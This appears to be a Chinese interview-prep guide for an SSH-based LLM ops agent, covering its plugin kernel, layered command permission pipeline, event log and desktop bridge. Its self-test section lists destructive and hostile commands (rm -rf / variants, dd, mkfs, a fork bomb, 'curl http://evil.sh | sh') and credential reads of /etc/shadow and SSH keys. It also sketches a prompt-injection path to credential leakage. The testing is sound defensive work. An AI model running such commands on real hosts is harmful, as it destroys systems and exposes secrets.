# OpsAgent 项目亮点与面试指南

> 本文档用于面试准备。所有数据、行为与代码片段均**经实测验证**，不含推测。
> 凡未实现或存在缺口的部分，都单独标注 —— 面试中主动说出边界，比被追问时露怯更有利。

---

## 一、电梯陈述

**30 秒版**

> OpsAgent 是一个**基于 SSH 的智能运维 Agent**。它让 LLM 自动执行只读诊断类运维任务，
> 但把「能不能执行」这个决定权从模型手里拿走了 —— 每一次工具调用都必须穿过一套
> 分层权限流水线，任一层拒绝即中止，全过程写入 append-only 的事件流。
> 架构上采用插件化内核，模型适配器、工具、权限层全部是可热插拔的插件。
> 我还用 Tauri 给它做了桌面客户端，让整个「推理 → 调用 → 拦截」的过程可视化。

**60 秒版（补上技术厚度）**

> 这个项目的核心命题是：**怎么让 LLM 碰生产服务器，又不至于出事。**
>
> 我的答案是三件事：
> 第一，**权限不是提示词，是代码里的强制检查点。** Agent 主循环是唯一编排工具调用的地方，
> 那里串了 L1 黑名单 / L2 白名单 / L3 注入检测三层，短路返回。
> 实测拦得住 `rm -rf /` 的各种变形写法，也拦得住 `df -h | bash` 这种管道注入。
> 第二，**一切皆插件。** 内核只做加载、卸载、依赖拓扑排序，一行业务逻辑都没有。
> 第三，**所有行为写入 append-only 事件流**，可审计、可回放、可校验完整性。
>
> 工程上我做了三件事来证明它不只是个玩具：**198 个测试、覆盖率 87%**，
> 全部离线可跑；给桌面端写了一层 stdio JSON-RPC 桥接，**用真子进程做端到端测试**；
> 以及在做安全审计时**自己发现了 L1/L2/L3 的一个真实缺口**并写进了已知限制。

---

## 二、项目规模（可量化）

| 维度 | 数据 |
| :--- | :--- |
| Python 核心 | 45 个文件 / **4,362 行** |
| 测试代码 | 13 个文件 / **1,695 行** / **198 个用例全绿** |
| 测试覆盖率 | **87%**（`pytest-cov`，权限层 L1/L3 与 pipeline 达 **100%**） |
| 桌面端前端 | **2,423 行**（React + TypeScript） |
| 桌面端外壳 | **464 行**（Rust） |
| 权限规则 | **121 条**（L1 34 / L2 79 / L3 8） |
| 事件类型 | **14 种**（封闭集合，未登记直接抛错） |
| 静态检查 | `ruff` 零告警；前端 `tsc --noEmit` 通过 |

**Agent 能力**：3 个工具插件（`ssh_execute` / `ssh_read_file` / `ssh_list_dir`）、
2 个模型适配器（DeepSeek / Mock）、SSH 连接池（按 `(host,user)` 复用，失败重试 ≤3 次）。

---

## 三、架构亮点

### 亮点 1：一切皆插件 —— 内核里没有业务逻辑

内核（`kernel/container.py`）只做四件事：插件加载/卸载、能力注册与解析、
事件总线持有、卸载钩子执行。**没有「特权内核」**。

新增能力只改一个地方 —— `runtime.py` 里的默认插件列表：

```python
def default_plugins(adapter: str = "mock") -> tuple[Plugin, ...]:
    """返回默认插件集（顺序无关，Kernel 会按依赖拓扑排序）。"""
    return (
        tool_registry_plugin,
        permission_pipeline_plugin,
        ssh_pool_plugin,
        ssh_execute_plugin,
        ssh_read_file_plugin,
        ssh_list_dir_plugin,
        ADAPTER_PLUGINS[adapter],
        agent_loop_plugin,
    )
```

注意插件列表**顺序无关** —— 依赖由 `load_all()` 做拓扑排序解决：

```python
async def load_all(self, plugins: Iterable[Plugin]) -> None:
    """多轮扫描：每轮加载"依赖已满足"的插件；
    某一轮没有任何进展 → 说明存在无法满足的依赖，立刻失败。"""
    pending = list(plugins)
    while pending:
        ready = [p for p in pending
                 if all(self.has(c) for c in p.requires) and p.name not in self._plugins]
        if not ready:
            raise MissingCapabilityError(...)   # 尽早失败，错误信息指出是谁依赖谁
        for p in ready:
            await self.load(p)
```

**代价与取舍**：插件化让「加一个工具」的成本很低，但也意味着**调试链路更长** ——
一个工具没生效，可能是没注册、依赖没满足、或能力被覆盖。我用两点缓解：
内核在能力被重复提供时打 warning，插件在 `load` 后校验「声明提供的能力是否真的注册了」。

### 亮点 2：能力三角色 —— Definition / Provider / Consumer

每个能力（Capability）强制拆成三层，禁止在契约里引入实现依赖：

| 角色 | 职责 | 位置 |
| :--- | :--- | :--- |
| **Definition** | 纯契约：接口、数据类型、错误定义 | `*/base.py` |
| **Provider** | 具体实现，自注册到 Kernel | `*/<impl>.py` |
| **Consumer** | 使用该能力，写入注册表或事件流 | `agent/` 或 `tools/` |

```python
# 能力用描述符声明，带类型参数，取出来时自动校验契约
SESSION_STORE: Final = capability("session_store", "会话事件流存储")
PERMISSION_PIPELINE: Final = capability("permission_pipeline", "权限校验流水线")

# 消费方不需要知道提供方是谁、怎么构造的
store = kernel.get(SESSION_STORE)
```

**为什么这么拆**：让「谁会实现」和「谁在使用」彻底解耦。
`agent/loop.py` 依赖的是 `PermissionPipeline` 这个**契约**，不是 `Layer1Blacklist` 这个**实现**。
所以我把 dry-run 假 SSH、Mock 模型换进来时，Agent 主循环一行没改。

### 亮点 3：可逆副作用 —— 卸载即完全撤销

这是本项目我最看重的一条工程约束。任何插件对内核的修改**必须同时登记撤销动作**：

```python
# ✅ 正确：订阅即登记退订
async def _setup(ctx: PluginContext) -> None:
    handle = ctx.events.on("*", self._on_event)
    ctx.on_unload(lambda: ctx.events.off(handle))   # 卸载时自动撤销

# ❌ 错误：进程活着没事，一旦卸载就泄漏
async def _setup(ctx: PluginContext) -> None:
    ctx.events.on("*", self._on_event)
```

内核在 `unload()` 时**倒序**执行这些钩子（后注册的先撤销），对应「栈式」的资源释放语义：

```python
async def unload(self, name: str) -> None:
    entry = self._plugins.pop(name, None)
    if entry is None:
        return
    entry.ctx.teardown()          # 倒序撤销
    for cap_name in entry.capabilities:
        self._capabilities.pop(cap_name, None)
        self._owners.pop(cap_name, None)
```

**这条约束在桥接层直接派上用场**：桌面端的 `configure()` 需要能反复重建内核
（用户切换适配器时）。如果事件订阅不可逆，第二次 `configure` 就会让同一个事件
被推送两遍、三遍…… 我给这条写了一个断言测试：

```python
async def test_shutdown_removes_all_event_subscriptions(self) -> None:
    """通配订阅者有两方 —— session_store（落盘）与 RPC 桥接（推给前端），
    两者都必须被注销，否则就是句柄泄漏。"""
    await server.configure(adapter="mock", session_path="")
    assert kernel.events.listeners("tool.before") == 2
    await server.shutdown()
    assert kernel.events.listeners("tool.before") == 0
```

> `listeners()` 会把 `*` 通配订阅也算进去 —— 这一点我一开始写错过断言，
> 测试报 `assert 0 == (2 - 1)` 才发现。这类「测试写错了，还是代码错了」的
> 判断过程，本身是能拿出来讲的。

### 亮点 4：分层权限 —— 决定权不在模型手里

Agent 主循环是**唯一**编排工具调用的地方，也是权限的强制检查点：

```python
# agent/loop.py — 没有 try/except 绕过，没有旁路
async def _execute(self, call: ToolCallRequest) -> StepRecord:
    ...
    decision = await self._permission.acheck(perm_call)   # ← 强制检查点
    record.layer = decision.layer
    record.allowed = decision.allowed
    if not decision.allowed:
        await self._emit("tool.after", tool=call.name, ok=False,
                         denied_by=decision.layer, reason=decision.reason)
        return record                                      # 直接返回，不执行
    outcome = await tool.invoke(call.arguments, self._tool_ctx)
```

三层各司其职，**短路返回第一个拒绝**：

| 层 | 规则数 | 职责 |
| :--- | :--- | :--- |
| **L1 全局黑名单** | 34 | 正则 + 字面量双路匹配，抗变形写法 |
| **L2 命令白名单** | 79 | 只放行只读命令；**管道/串联的每一段单独过审** |
| **L3 注入检测** | 8 | 命令替换、重定向、畸形引号、后台执行 |

**设计细节值得讲的两点**：

其一，L2 要求 `top` 必须带 `-b`。这不只是安全考量 —— 交互式命令会**挂住会话**，
在自动化场景里等于把 Agent 卡死。这是「可用性」和「安全性」的交叉点：

```text
top    → 拒绝 [L2] 命令 'top' 必须带参数 '-b'（避免阻塞会话）
```

其二，L1 用的是**正则 + 字面量双路**而非单一路径。`rm -fr /` 这种参数顺序变体
靠字面量匹配抓不到，必须靠正则 `/\brm\s+-[a-z]*[rf]/`。

### 亮点 5：append-only 事件流 —— 审计、回放、压缩的唯一数据源

事件类型是**封闭集合**，新增类型必须先登记，否则构造时就抛错：

```python
@dataclass(frozen=True)
class SessionEvent:
    def __post_init__(self) -> None:
        if self.type not in EVENT_TYPES:
            raise ValueError(f"未登记的事件类型: {self.type}（请先在 session/event.py 登记）")
```

**为什么封闭**：事件流同时是审计日志、回放素材、上下文压缩输入。
如果谁都能往里塞新类型，下游三个消费者都得跟着改，且无法穷举处理。
封闭集合把「扩展」变成一次**显式的、需要过评审的**决策。

落盘是 JSONL，一行一条 —— 天然 append-only，不改写不删除，只追加。
配合 `seq` 严格递增，就得到了一个廉价的篡改/丢写检测：

```python
def verify_integrity(self) -> bool:
    """seq 必须严格递增且从 1 开始。"""
    return [e.seq for e in self._events] == list(range(1, len(self._events) + 1))
```

### 亮点 6：桌面端桥接 —— 不改造核心，也能拿到实时流

GUI 需要「事件边跑边显示」。我没有把核心改造成 HTTP 服务，而是新加了一层
**stdio JSON-RPC sidecar**：

```text
React ──Tauri IPC──► Rust（只搬字节，无业务逻辑）──stdin/stdout NDJSON──► Python bridge
                                                                              │
                                                                        Kernel（既有核心）
```

**协议约定只有一条，但它撑起了整个前端架构**：*带 `id` 的是响应，不带 `id` 的是推送。*

```jsonc
{"jsonrpc":"2.0","id":1,"result":{…}}                          // 应答
{"jsonrpc":"2.0","method":"event","params":{"type":"tool.before",…}}  // 推送
```

前端因此可以用一个订阅入口分流所有消息，不需要为「事件流」单独设计一套通道。

**为什么选 stdio 而不是本地 HTTP**：不开监听端口 → 没有防火墙授权弹窗；
「进程即权限边界」→ 别的进程连不上；不需要额外引入 web 框架依赖。
Tauri 的 `externalBin` / sidecar 机制也原生支持这种形态。

---

## 四、关键技术难点与解法

这一节是面试里最有信息量的部分 —— 都是**真实踩过的坑**，不是设想。

### 难点 1：取消一个正在跑的请求，怎么写才不会引入竞态

**问题**。GUI 有「停止」按钮，需要中断正在执行的诊断。朴素写法是
`create_task(work)` + `wait_for(cancel_event)`，但这样有三个坑：

1. 工作协程抛错时异常会被挂起、无人 `await`，最后变成
   `Task exception was never retrieved` 噪音
2. Python 3.12 之前 `wait_for` 会连带取消掉**本不该被取消**的任务
3. 「刚取消就恰好跑完」时结果不确定

**解法 —— 合并通知**。把「取消」和「完成」都表达成**同一个** `threading.Event`，
调用方只等这一个事件，再用 `cancelled` 标志分辨发生了什么：

```python
async def run_pending(table, msg_id, method, work, *, timeout=DEFAULT_TIMEOUT):
    pending = table.open(msg_id, method)
    task: asyncio.Task[Any] | None = None
    try:
        task = asyncio.create_task(work(pending))
        # 关键：工作一结束（成功或抛错）就唤醒等待方
        task.add_done_callback(lambda _t: pending.finish())

        await _wait_event(pending.event, timeout=timeout)

        # 取消优先于完成判定 —— 否则「刚取消就恰好跑完」会产生不确定结果
        if pending.cancelled:
            raise RpcError(INTERNAL_ERROR, f"已取消：{pending.reason}")
        if not task.done():
            raise RpcError(INTERNAL_ERROR, f"请求超时（>{timeout:.0f}s）")
        return task.result()
    finally:
        table.close(msg_id)
        if task is not None and not task.done():
            if pending.cancelled:
                # 协作式取消：让工作协程自己看到 should_stop 后干净收尾
                task.add_done_callback(_swallow)
            else:
                task.cancel()
```

有三处是**踩了坑才补上**的：

- `add_done_callback(lambda _t: pending.finish())` —— 我第一版漏了这行，
  结果**测试直接挂死**：事件永远不置位，`run` 只能等到 300 秒超时。
  现象是 `pytest` 跑了 2 分钟不动，我杀掉后逐行读才发现等待点是单向的。
- **取消判定必须优先于完成判定**，否则「取消」与「完成」同时到达时行为不定。
- **协作式取消，不用 `task.cancel()`**：强制取消会在任意 `await` 点打断协程，
  可能把 Kernel 留在半初始化状态。改成工作协程轮询 `pending.should_stop` 自己退出，
  取消就变成一次干净的收尾。

**顺带解决的一个边界**：请求 id 可能是 `int` 也可能是 `str`，
`1` 和 `"1"` 必须各自成项，否则会互相取消。用 `f"{type(id).__name__}:{id}"` 做键：

```python
def test_int_and_str_ids_do_not_collide(self) -> None:
    table = PendingTable()
    table.open(1, "run")
    table.open("1", "run")
    assert len(table) == 2          # 不能互相覆盖
```

### 难点 2：stdout 是协议信道，任何 `print` 都会污染它

**问题**。stdio 通信里，stdout 承载协议数据。一旦某处有个调试用的 `print`，
前端就会收到半行 JSON，解析失败、配对错乱 —— 而且这种 bug 在开发时往往
不会立刻暴露（本地跑得好好的）。

**解法 —— 三重约束**：

1. **写字节不走文本层**，绕开 Windows 上 `\n` → `\r\n` 的转换：

```python
def _write_stdout(payload: dict[str, Any]) -> None:
    """刻意用 sys.stdout.buffer 直接写字节：绕开文本层的换行/编码转换，
    避免 Windows 上把 \\n 变成 \\r\\n 污染行分割。"""
    out = getattr(sys.stdout, "buffer", None)
    out.write(encode(payload).encode("utf-8"))
    out.flush()
```

2. **日志全部重定向到 stderr**，并且 stderr 的每一行加标记转发给前端做诊断 ——
   既不污染协议，又不丢日志：

```rust
// Rust 侧：stderr 的行套上 {"__stderr__": "..."} 再回传
let _ = tx.send(SidecarOutput::Line {
    text: format!("{{\"__stderr__\":{}}}", json_string(&text)),
});
```

3. **用测试把这个约束钉死** —— 端到端测试断言每一行都能被 `json.loads`：

```python
def test_stdout_stays_clean_json(self, sidecar):
    """协议信道的核心约束：stdout 只有 JSON 行。
    任何调试用的 print 都会污染这里 —— 所以本测试断言每一行都可解析。"""
    for message in sidecar.pushed:
        assert isinstance(message, dict)
        assert "jsonrpc" in message
```

### 难点 3：NDJSON 的分帧 —— 一次读取可能切在消息中间

**问题**。管道读取的边界和消息边界**毫无关系**。一次 `read()` 可能读到半条消息，
也可能一次读到三条。

**解法**。写一个带缓冲的增量解析器，由它负责拼接：

```python
class LineCodec:
    def feed(self, chunk: str) -> list[dict[str, Any]]:
        """喂入一段文本，返回其中已经完整的所有消息。"""
        self._buffer += chunk
        messages = []
        while "\n" in self._buffer:
            line, self._buffer = self._buffer.split("\n", 1)
            ...
```

关键测试是「切点在第二条消息的 JSON 中间」这种最刁钻的情况：

```python
def test_split_across_chunks_mid_message(self) -> None:
    codec = LineCodec()
    assert codec.feed('{"a":1}\n{"b"') == [{"a": 1}]   # 前一条完整，后一条半截
    assert codec.feed(':2}\n') == [{"b": 2}]           # 补齐后才产出
```

另外**坏行不能拖垮链路**：单行 JSON 解析失败时标记为 `__malformed__` 继续走，
由上层回一个 `-32700` 错误，进程照常服务。这条也有测试覆盖
（`test_malformed_line_does_not_kill_process`）。

### 难点 4：出站脱敏 —— 一处做对，而不是处处记得做

事件流会同时流向**界面、日志、磁盘**。在每个产生事件的地方都记得脱敏是不可靠的 ——
总有一个地方会漏。

**解法**：在序列化的**出口**统一递归抹掉疑似凭据字段，只有一处需要正确：

```python
_SENSITIVE_KEYS = frozenset({
    "api_key", "apikey", "password", "passwd", "secret",
    "token", "private_key", "credential",
})

def _redact(data: dict[str, Any]) -> dict[str, Any]:
    """递归抹掉疑似凭据字段。
    事件流会被 GUI 原样展示、也会落盘，所以脱敏放在出站边界做一次，
    而不是指望每个调用点都记得处理。"""
```

并且把「只回报有没有 Key，绝不回报 Key 本身」作为契约：

```python
def _api_key_present() -> bool:
    """只回报「有没有」Key，绝不回报 Key 本身。"""
    return bool(os.environ.get("DEEPSEEK_API_KEY"))
```

对应测试直接**扫全量推送内容**找泄露特征：

```python
async def test_run_push_never_leaks_api_key(self, live_server):
    blob = json.dumps(live_server.pushed, ensure_ascii=False)
    assert "sk-" not in blob, "推送内容里不应出现疑似 API Key"
```

### 难点 5：Rust 里把 `State` 借进异步任务 —— `'static` 不满足

**问题**。Tauri 的 `app.state::<T>()` 返回的是**借用**。把它捕获进
`tauri::async_runtime::spawn` 的 future 会编译不过 —— 因为 spawn 要求 `'static`。

**解法**。跨任务共享的东西全部先做成**可克隆的 owned 句柄**
（`Arc<SidecarManager>`、`Arc<Mutex<Receiver>>`、`AppHandle`），
任务只捕获这些克隆，不碰 `State` 的借用：

```rust
let (sender, receiver) = mpsc::unbounded_channel::<SidecarOutput>();
let receiver = Arc::new(Mutex::new(receiver));   // 先做成可克隆的

// 事件泵：捕获的全是 owned 克隆，因此这个 future 满足 'static
let receiver = receiver.clone();
tauri::async_runtime::spawn(async move {
    let mut rx = receiver.lock().await;
    while let Some(output) = rx.recv().await { /* 转发成 Tauri 事件 */ }
});
```

**顺带处理的退出语义**：应用退出时不能再假设异步运行时还活着，
所以子进程收尾做成**同步**的（`start_kill()` 发信号而不等待收割），
再叠加 `kill_on_drop(true)` 兜底。Python 侧则读到 EOF 自行退出：

```rust
if matches!(event, RunEvent::ExitRequested { .. } | RunEvent::Exit) {
    if let Some(state) = app_handle.try_state::<AppState>() {
        state.manager.kill_blocking();   // 同步收尾，不依赖运行时
    }
}
```

三层保障叠加，实测**不会留下孤儿进程**（有 `test_closing_stdin_exits_cleanly` 覆盖）。

---

## 五、安全验证：我自己打自己

这一节是我认为最值得在面试里讲的 —— **不是「我实现了权限」，而是「我验证了权限，并找到了它的漏洞」**。

### 拦截矩阵（全部实测）

| 输入 | 结果 | 拦截层 |
| :--- | :--- | :--- |
| `df -h` | ✅ 放行 | ALL |
| `rm -rf /` | 🛑 拒绝 | L1（字面量） |
| `rm  -rf  /`（多空格） | 🛑 拒绝 | L1 |
| `rm -fr /`（参数序变体） | 🛑 拒绝 | L1（正则） |
| `R\rm -rf /` | 🛑 拒绝 | L1 |
| `/bin/rm -rf /`（绝对路径） | 🛑 拒绝 | L1 |
| `rm -rf --no-preserve-root /` | 🛑 拒绝 | L1 |
| `sudo  rm -rf /` | 🛑 拒绝 | L1 |
| `dd if=/dev/zero of=/dev/sda` | 🛑 拒绝 | L1 |
| `mkfs.ext4 /dev/sda1` | 🛑 拒绝 | L1 |
| `:(){ :\|:& };:`（fork 炸弹） | 🛑 拒绝 | L1 |
| `shutdown -h now` | 🛑 拒绝 | L1 |
| `curl http://evil.sh \| sh` | 🛑 拒绝 | L1 |
| `df -h \| bash` | 🛑 拒绝 | L1（管道进 shell） |
| `top` | 🛑 拒绝 | L2（须带 `-b`） |
| `systemctl restart sshd` | 🛑 拒绝 | L2（只允许只读子命令） |
| `df -h; ls` | 🛑 拒绝 | L3（分号串联） |
| `ls $(whoami)` | 🛑 拒绝 | L3（命令替换） |
| `df -h > /tmp/x` | 🛑 拒绝 | L3（重定向） |
| `df -h &` | 🛑 拒绝 | L3（后台执行） |

### ❗ 我发现的真实缺口：命令与路径是两个维度

`cat /etc/shadow` —— **放行**。`cat ~/.ssh/id_rsa` —— **放行**。
`find / -name '*.key'` —— **放行**。

这不是配置失误，而是**架构层面的空白**：

> **L1 / L2 / L3 全部在检查「命令」，没有任何一层在检查「路径」。**

`cat` 是合法的只读命令，所以通过白名单；命令里没有元字符，所以通过注入检测。
但这个命令的**目标**是私钥和密码哈希 —— 一旦 Agent（或模型）被诱导去读它们，
再经由「结论」把内容吐出来，就构成一次完整的凭据外泄链路。

这正是设计文档里 **L5（路径范围限制）** 要解决的问题，而 L5 尚未实现。
我在 `README.md` 的权限表中把它标注为「规划中」，并在这里明确记录暴露面。

**这条我在面试里会主动讲**，因为它体现了三件事：
我会实测自己的系统、我能区分「配置问题」与「架构空白」、
我不会因为是自己写的项目就掩饰缺口。

### 另一个发现：正则的精度问题（误伤合法诊断）

`cat /etc/passwd` —— **拒绝**。但拒绝理由是黑名单命中了 `/\bpasswd\b/`
（本意是拦 `passwd` 改密码命令），**而不是**因为读了敏感文件。

问题在于：`cat /etc/passwd` 是**完全合法的只读诊断操作**（看用户列表是排查权限问题的常规手段）。
它被拦下纯属正则**过宽**导致的误伤 —— 是「意外正确」。

这说明 L1 这类关键词黑名单天然存在**精度与覆盖的张力**：
规则写宽松了误伤合法操作，写严格了容易被绕过。
长期看更可靠的方向是**结构化解析命令**（把 `argv` 拆出来，识别「命令 + 参数 + 目标」），
而不是在字符串上做正则 —— 这也正是我下一步想做的事。

---

## 六、测试策略

**核心原则：全部离线可跑。** 不联网、不连真实主机、不需要 API Key。

| 层次 | 做法 | 用例数 |
| :--- | :--- | :--- |
| **权限层** | 表驱动，**专门覆盖绕过变形写法** | 73 |
| **内核** | 插件拓扑排序、能力解析、卸载撤销 | 16 |
| **工具** | 假 SSH 连接（按命令首词返回预置输出） | 12 |
| **桥接协议** | 分帧、取消、脱敏、分发（纯内存，不启进程） | 36 |
| **桥接集成** | **真组装 Kernel** 跑通 run / checkCommand / permission | 21 |
| **sidecar 端到端** | **真起子进程**，走 stdin/stdout 对话 | 12 |
| **会话 / 上下文 / CLI** | 落盘完整性、压缩、命令行入口 | 28 |

`ssh/fake.py` 预置了 `df` / `free` / `ps` / `ls` / `journalctl` 的样例输出，
按命令首词匹配。所以断言可以精确到数据内容：

```python
assert "19G" in result.steps[0].output    # 验证假数据确实回灌给了模型
```

**端到端测试的价值**在这个项目上特别明显：正因为有真子进程的 E2E，
我才在接受端到端测试时立刻发现 `run` 会挂死（缺 `add_done_callback`）——
如果只写纯内存单测，这个 bug 会一路活到用户手上才暴露。

---

## 七、工程实践：文档与代码的一致性

面试常被问「你是怎么保证代码质量的」。我的一点体会是：
**文档里写的东西必须能被执行验证，否则就是负债。**

接手这个项目时我对了一遍 README 与代码，发现几处不符并全部修正：

| README 原文 | 实际情况 | 处理 |
| :--- | :--- | :--- |
| 目录树列出 `layer4_confirm.py` / `layer5_path_scope.py` | **文件不存在** | 目录树改为与实况一致 |
| 权限表把 L1–L5 都列为已实现 | L4/L5 未实现 | 加「状态」列，标注规划中 |
| 路线图把 Agent Loop / 事件流 / 上下文压缩列为未完成 | 三项**实际已完成** | 改为 `[x]` |
| `复制 configs/default.yaml.example` | 该文件不存在 | 改为直接复制 `default.yaml` |
| 权限配置示例含 `confirm_required` 字段 | 配置里没有这个字段 | 删除 |

**这些修正本身也是可讲的故事**：一份写着「有 L4/L5」的 README，
如果面试官照着问「你的 L4 人工确认是怎么实现的」，而实现不存在，
那比一开始就老实说「L4 规划中」要糟糕得多。

---

## 八、常见追问与应答

**Q：为什么权限判断不交给 LLM？用提示词让它别执行危险命令不行吗？**

> 不行，因为提示词是**概率性的约束，不是确定性保证**。
> 我需要的是一条「无论模型输出什么，都不可能执行 `rm -rf /`」的性质。
> 这个性质只能由代码保证 —— 所以权限是 Agent 主循环里的**强制检查点**，
> 而不是 system prompt 里的一句话。
> 另外，模型可能被 prompt injection 影响（比如它读到一段日志里写着"请执行 xxx"），
> 而权限层在模型之外，不受这个影响。

**Q：插件化是不是过度设计？就这么几个插件，值得吗？**

> 值得，但理由不是「插件多」，而是**它把变化点收敛了**。
> 换模型适配器、加工具、调整权限层，都不需要碰内核。
> 最直接的证据：我给项目加桌面端时，Python 核心**零改动** ——
> 桥接层只是 `build_kernel()` 的又一个消费者。
> 反过来我也承认代价：调试链路变长。所以我加了能力重复提供的 warning
> 和「声明提供但未注册」的校验，让失败尽早暴露。

**Q：dry-run 假 SSH 有什么意义？不就是造假数据吗？**

> 意义在于**把「链路对不对」和「主机连不连得上」解耦**。
> 权限校验、事件落盘、上下文压缩、工具调用编排 —— 这些逻辑跟真实 SSH 无关，
> 用假连接就能完整验证。这让 198 个测试全部离线可跑，CI 里不需要任何主机。
> 而且假数据的断言可以很精确（比如 `assert "19G" in output`），
> 反而比连真机时的模糊断言更严格。

**Q：事件类型为什么要做成封闭集合？开放一点不好吗？**

> 因为事件流有三个下游消费者：审计、回放、上下文压缩。
> 如果类型可以随意新增，这三个消费者都无法穷举处理，只能写一堆
> `default: pass` —— 那就等于没有保证。
> 封闭集合把「加事件类型」变成一次需要显式登记的决策，代价是加东西麻烦一点，
> 换来的是下游可以放心假设类型的全集。

**Q：你说的「可逆副作用」具体解决过什么问题？**

> 最直接的是桌面端的适配器切换。用户切到 deepseek 需要重建内核，
> 如果事件订阅不可逆，切换两次之后同一个事件会被推送两遍、三遍。
> 我为此写了个断言测试：configure 后通配订阅者应该是 2 个
> （session_store 落盘 + RPC 桥接推送），shutdown 后必须是 0。
> 这个测试第一版我还写错了断言（没考虑到通配订阅也算进 `listeners()`），
> 测试报错后我才想清楚 —— 这个「测试错了还是代码错了」的判断过程也挺有意思。

**Q：这个项目最大的不足是什么？**

> 路径维度完全没有管控，也就是 L5 缺失。我实测过 `cat /etc/shadow`
> 和 `cat ~/.ssh/id_rsa` 都能通过全部三层校验 —— 因为 L1/L2/L3 检查的是
> 「命令」，而这些命令本身合法。这构成一条完整的凭据外泄链路：
> 模型被诱导读私钥 → 通过权限层 → 内容进入结论 → 泄露。
> 这是架构层面的空白，不是配置疏漏，所以我把它写进了 README 的「已知限制」，
> 而不是偷偷补几条正则糊过去。

**Q：如果重做，你会改什么？**

> 三点：
> 一，**权限层从「字符串正则」升级为「结构化命令解析」** ——
> 把命令拆成 `argv`，识别「程序 + 参数 + 目标路径」。
> 现在 `cat /etc/passwd` 被误拦（正则 `\bpasswd\b` 过宽），
> 而 `cat /etc/shadow` 被放行，两个都需要靠结构化解析才能正确处理。
> 二，**补 L4 人工确认** —— 配置里已经留了 `confirm_required` 的位置，
> 桥接层也已经有「服务端主动推送 + 客户端应答」的通道，接起来很自然。
> 三，**Rust 与前端接入 CI** —— 当前只有 Python 侧有测试保障。

---

## 九、已知限制（诚实清单）

1. **L5 路径范围未实现** → 敏感路径的只读访问不受管控（见第五节实测）。
2. **L4 人工确认未实现** → 高危写操作目前是一律拒绝，没有「申请后放行」通路。
3. **L1 正则存在误伤** → `cat /etc/passwd` 这类合法诊断被拦，属精度问题。
4. **Agent 会话单线程串行** → 上下文有状态，并发运行会互相污染（已在桥接层限制）。
5. **桌面端固定 `dry_run=True`** → SSH 走假连接，接真实主机需先配置认证。
6. **`deepseek.py` 覆盖率 59%** → 主路径未覆盖（无联网测试），仅覆盖错误分支。
7. **Rust / 前端未接入 CI** → 两侧均已本地验证通过
   （`cargo check` 零警告、`cargo build` 产出二进制、`tsc --noEmit` 与
   `vite build` 通过），但还没有自动化流水线；需要在干净环境补上。
   记录一个真实排查经历：Windows 上 `rustc.exe` 曾以 `0xc0000005`
   （STATUS_ACCESS_VIOLATION）崩溃且集中在 proc-macro crate，
   根因是 **target 目录产物损坏 / 实时扫描干扰** —— `cargo clean` 后重建即恢复，
   与代码无关。判断「环境问题还是代码问题」的顺序是：
   先看崩溃点是否集中在 proc-macro、是否所有 crate 都崩，
   再 `cargo clean` 排除产物损坏，最后才怀疑代码。
8. **沙箱环境限制** → 本机 `reg.exe` / `sc.exe` 被策略拦截，
   部分环境排查无法进行。

---

## 十、答辩时的一句话总结

> 这个项目我做的核心判断是：**当你要把执行权交给 LLM，就必须在它之外建立
> 一套确定性的约束。** 权限流水线是这套约束，append-only 事件流是它的证据链，
> 插件化内核是让这套约束能被替换和演进的载体。
>
> 而工程上我坚持两件事：**所有结论都要能被执行验证**（198 个测试、全部离线可跑），
> 以及 **诚实标注边界** —— L5 缺失是我自己测出来的，写在 README 里，
> 而不是等面试官问到才承认。

---

*文档随代码演进。修改实现后请同步更新本文档中的数据与结论。*
